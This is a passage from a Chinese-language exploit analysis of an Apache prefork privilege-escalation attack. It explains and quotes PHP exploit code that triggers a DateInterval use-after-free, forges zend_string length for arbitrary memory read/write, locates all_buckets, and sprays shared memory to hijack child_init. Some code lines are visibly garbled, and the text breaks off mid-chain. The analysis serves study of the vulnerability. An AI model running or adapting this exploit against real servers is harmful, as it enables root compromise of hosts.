    # Protect $p's timelib_rel_time structure
    $protector = ".$_protector";
接着就是最重要的一步：
    $x = new DateInterval('PT1S');
再次创建一个DateInterval，它的timelib_rel_time结构将刚好占据上图中free的内存位置，同时$this->abc仍然是可以访问free这块内存的，即：&timelib_rel_time
== &zend_string。因此我们可以通过修改DateInterval对象来修改zend_string.len，从而控制可以读/写内存的长度。
完成上述步骤后，我们还需要验证UAF是否成功，在这之前先看一下DateInterval的定义：
    DateInterval {
    /* Properties */
    public integer $y ;
    public integer $m ;
    public integer $d ;
    public integer $h ;
    public integer $i ;
    public integer $s ;
    public float $f ;
    public integer $invert ;
    public mixed $days ;
    /* Methods */
    public __construct ( string $interval_spec )
    public static createFromDateString ( string $time ) : DateInterval
    public format ( string $format ) : string}
因为有&timelib_rel_time ==
&zend_string，所以这里的$d和$y分别对应zend_string里的len和val。可以将$x（DateInterval）的h属性设置为0x13121110，再通过$this->abc字符串（zend_string）访问来判断UAF成功与否。
    # zend_string.refcount = 0
    $x->y = 0x00;
    # zend_string.len
    $x->d = 0x100;
    # zend_string.val[0-4]
    $x->h = 0x13121110;
    if(!(
      strlen($this->abc) === $x->d &&
      $this->abc[0] == "\x10" &&
      $this->abc[1] == "\x11" &&
      $this->abc[2] == "\x12" &&
      $this->abc[3] == "\x13")){
      o('UAF failed, exiting.');
      exit();
    }
      o('UAF successful.');;
最后别忘了释放掉$room，产生的空闲块将保护我们控制的结构，后面再新建变量都会优先使用这些内存。
    unset($room)
**2.2.5 控制并修改UAF的结构**
利用这个PHP漏洞的目的是为了能够获取读写SHM的权限，现在我们能够读写zend_string.val的内容，能读写的长度是zend_string.len，因此只要将len的值增加到包括SHM的范围。
这时我们已经知道了SHM的绝对地址，还需要知道abc的绝对地址，得到两者之间的偏移量才可以修改len。因此需要找到字符串$this->abc在内存中的位置：
    $address = str2ptr($this->abc, 0x70 * 2 - 24);
    $address = $address - 0x70 * 3;
    $address = $address + 24;
    o('Address of $abc: 0x' . dechex($address));
然后我们就可以计算两者间的偏移量了，还要注意的是，因为后面我们需要在内存中查找all_bucket，而它在apache的内存中所以我们的len需要将SHM和apache的内存都覆盖到，所以作者的WriteUp中说SHM和apache的内存都需要在PHP堆之后，而它们也确实都在PHP堆之后。
找SHM和apache的内存两者间较大的值，减去abc的地址，将得到的偏移通过DateInterval的d属性修改来修改zend_string.len。
    $distance =   max($addresses['apache'][1], $addresses['shm'][1]) - $address;
    $x->d = $distance;
这等同于将zend_string结构（$this->abc）中的len修改为一个超大的值，一直包括到SHM和Apache内存区域，这下我们就可以读写这个范围内的内存了。
### 2.3 定位all_buckets的位置
根据内存模式查找all_buckets数组的位置，这在作者的writeup中有提到。mutex在all_buckets偏移0x10的位置，而meth在mutex偏移0x8的位置，根据该特征查找all_buckets数组。
首先，在apache的内存中搜索all_buckets[idx]->mutex，接着验证meth，是否在libapr.so的.data段中，最后因为meth指向libapr.so中定义的函数，因此验证其是否在.text段。满足这些条件的就是我们要找的all_buckets[]结构。
        $all_buckets = 0;
        for(      $i = $addresses['apache'][0] + 0x10;
          $i abc, $i - $address);
          if(!in($pointer, $addresses['apache']))
            continue;
          # meth
          $meth = $pointer = str2ptr($this->abc, $pointer + 0x8 - $address);
          if(!in($pointer, $addresses['libaprR']))
            continue;
          o('  [&mutex]: 0x' . dechex($i));
          o('    [mutex]: 0x' . dechex($mutex));
          o('      [meth]: 0x' . dechex($meth));
顺便将meth结构中所有函数指针打印出来，第6个就是我们要覆盖的(*child_init)()。
          # meth->*
          # flags
          if(str2ptr($this->abc, $pointer - $address) != 0)
            continue;
          # methods
          for($j=0;$jabc, $pointer + 0x8 + $j * 8 - $address);
            if(!in($m, $addresses['libaprX']))
              continue 2;
            o('        [*]: 0x' . dechex($m));
          }
          $all_buckets = $i - 0x10;
          o('all_buckets = 0x' . dechex($all_buckets));
          break;
        }
这是meth的结构的定义，可以对照调试结果着看一看：
    struct apr_proc_mutex_unix_lock_methods_t {
        unsigned int flags;
        apr_status_t (*create)(apr_proc_mutex_t *, const char *);
        apr_status_t (*acquire)(apr_proc_mutex_t *);
        apr_status_t (*tryacquire)(apr_proc_mutex_t *);
        apr_status_t (*release)(apr_proc_mutex_t *);
        apr_status_t (*cleanup)(void *);
        apr_status_t (*child_init)(apr_proc_mutex_t **, apr_pool_t *, const char *);
        const char *name;
    };
### 2.4 计算索引bucket
再回忆一下漏洞利用的方法：在SHM中构造payload
（prefork_child_bucket结构），同时将剩余SHM区域喷射payload地址（并非payload起始地址），
控制指向喷射区域，所以&all_buckets[bucket]中的meth必然指向payload
，而payload中我们已将child_init函数的指针覆盖为我们想要执行函数的指针，就可以达到漏洞利用的目的。要想控制&all_buckets[bucket]指向prefork_child_bucket结构，不能直接将该结构精确放在某个位置，然后直接计算两者间的偏移，因为all_buckets的地址在每优雅重启后会发生变化，所以漏洞被触发时all_buckets的地址将与我们找到的地址是不同的，这就是作者在EXP中进行堆喷的目的。
all_buckets是一个结构体数组，元素prefork_child_bucket结构由三个指针组成：
    typedef struct prefork_child_bucket {
        ap_pod_t *pod;
        ap_listen_rec *listeners;
        apr_proc_mutex_t *mutex;
    } prefork_child_bucket;
如果在SHM中大量喷射一个指向payload的地址，只要让&all_buckets[bucket]落在该区域内，payload就能得到执行，如下图中所示：
并且在EXP中，作者一共使用了两种方法来提高利用成功率：
  1. 喷射SHM，也就是上面提到的方法
  2. 修改每个worker的process_score->bucket结构，这样一来，利用成功率就可以再乘以Apache Worker的数量。这也是exp开始时调用$workers_pids = get_workers_pids();的原因。
先看第一种方法的实现：
SHM的起始部分是被apache的各个进程使用的，可以用SHM末尾的绝对地址$spray_max，减去未使用的内存空间大小$spray_size，得到要喷射区域的大小$spray_size；而未使用空间的大小可以通过减去已使用worker_score结构的总大小得到。
    $size_prefork_child_bucket = 24;$size_worker_score = 264;
    $spray_size = $size_worker_score * (256 - sizeof($workers_pids) * 2);
    $spray_max = $addresses['shm'][1];
    $spray_min = $spray_max - $spray_size;
然后找喷射区域地址的中间值，计算它和all_buckets地址的偏移，再除以prefork_child_bucket结构的大小，就可以得到一个all_buckets数组下标索引，但别忘了SHM在all_buckets之前，所以这个索引还要取负值，这个值用$bucket_index_middle表示。
    $spray_middle = (int) (($spray_min + $spray_max) / 2);
    $bucket_index_middle = (int) ( - ($all_buckets - $spray_middle) / $size_prefork_child_bucket );
这样做的目的在于，在每优雅重启后，即便all_buckets的地址有所变化，&all_buckets[bucket]指向的位置会在$spray_middle上下浮动，最大程度上保证了该指针落在喷射的内存范围内，如下图所示：
### 2.5 设置Payload比开始喷射SHM
Payload由三个部分组成
  1. bucket，用来存放要执行的命令，这是因为payload已经成了几个结构的叠加。
  2. meth，它还是apr_proc_mutex_unix_lock_methods_t结构，只是它的child_init替换成了zend_object_std_dtor，其他指针置空。
  3. properties，这是PHP内部结构zend_object的一个成员。
回忆漏洞的攻击链，最后的child_init被替换成函数zend_object_std_dtor执行，其原型如下，传入一个zend_object结构：
    ZEND_API void zend_object_std_dtor(zend_object *object);
所以原本传给child_init的&my_bucket->mutex（prefork_child_bucket结构的一部分）就和zend_object相叠加了。
zend_object_std_dtor的执行又导致以下调用链：
    ...
    mutex = &my_bucket->mutex
    apr_proc_mutex_child_init(mutex)
        //(*mutex)->meth->child_init()
        (*mutex)->meth->zend_object_std_dtor(object)    //[object = mutex]
            ht = object->properties
            zend_array_destroy(ht)
            zend_hash_destroy(ht)
                val = &ht->arData[0]->val